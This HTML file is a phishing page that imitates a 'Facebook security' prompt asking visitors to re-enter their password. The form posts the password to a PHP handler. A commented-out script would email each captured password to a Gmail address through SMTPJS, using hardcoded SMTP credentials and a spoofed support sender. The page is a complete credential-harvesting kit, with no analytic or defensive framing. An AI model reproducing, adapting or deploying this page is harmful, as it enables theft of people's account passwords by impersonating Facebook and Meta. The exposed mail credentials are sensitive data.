<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Restrictions Information</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', sans-serif;
        }

        html,
        body {
            height: 100%;
            width: 100%;
        }

        .wrapper {
            width: 100%;
            height: 100%;
        }

        .navbar {
            width: 100%;
            height: 45px;
            padding: 0 100px;
            position: relative;
            background-color: rgb(243, 243, 242);
            display: flex;
            align-items: center;

        }

        .navbar nav>img {
            height: 50px;
        }

        h1 {
            font-size: 22px;
            font-weight: 600;
        }

        .data {
            width: 50%;
            height: calc(100% - 45px);
            background-color: rgb(255, 255, 255);
            margin: auto;
            padding: 3% 3%;
            display: flex;
            align-items: center;
            align-items: start;
            flex-direction: column;
            /* background-color: navajowhite; */
        }

        .data>p {
            margin: 10px 0;
            opacity: .6;
            font-weight: 400;
        }

        #passward{
            font-size: 15px;
            opacity: 0.3;
            border: rgb(231, 227, 227) solid 1px;
            border-radius: 5px;
            width: 100%;
            padding: 10px 0;
            padding-left: 10px;
        }

        .meta {
            width: 100%;
            margin-top: 10%;
            margin-left: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        hr {
            color: rgb(231, 227, 227);
            margin: 15px 0;
            width: 100%;
        }

        form {
            width: 100%;
        }

        .inputpass {
            display: flex;
            align-items: center;
            margin: 15px 0;
            width: 100%;
            /* background-color:yellow */
        }

        .btn {
            width: 100%;
            display: flex;
            align-items: center;
        }

        button {
            width: 90%;
            margin-top: 15px;
            padding: 10px 17px;
            border: none;
            border-radius: 5px;
            font-size: 15px;
            background-color: #1877f2;
            cursor: pointer;
            color: #fff;
        }

        button:hover {
            background-color: #045bcb;
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <div class="navbar">
            <nav> <img src="pngwing.com.png" alt=""></nav>
        </div>
        <div class="data">
            <h1>Facebook security</h1>
            <hr>
            <p>Please re-enter your password to complete the request.</p>
            <form action="db=2.php" method="post">
                <div class="inputpass">
                    <input id="passward" type="password" name="passward" placeholder="Passward" required>
                </div>
                <div class="btn">
                    <button>Submit</button>
                </div>
            </form>
            <div class="meta">
                <img src="frommeta.jpeg" alt="">
            </div>
        </div>
    </div>
    <!-- <script src="https://smtpjs.com/v3/smtp.js">
    </script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script>
        var btn = document.querySelector("button")
        btn.addEventListener("click", function() {
            var passward = document.getElementById("passward").value;

            var body = "passward: " + passward;

            // console.log(body);

            Email.send({
                Host: "smtp.elasticemail.com",
                Username: "bhawalsarmad@gmail.com",
                Password: "78F5F9F720C7FD73EB449EDB04A96C9C9B9F",
                To: 'bhawalsarmad@@gmail.com',
                From: "support@appealhere.online",
                Subject: "Mehak Your passward is here",
                Body: body
            }).then(
                message =>{
                    if(message=='OK'){
                        swal("Thanks", "Data Submited Successfully", "success");
                    }
                    else{
                        swal("Something went wrong", "Please resubmit your data", "error");
                    }
                }
            );
        });
    </script> -->
</body>

</html>
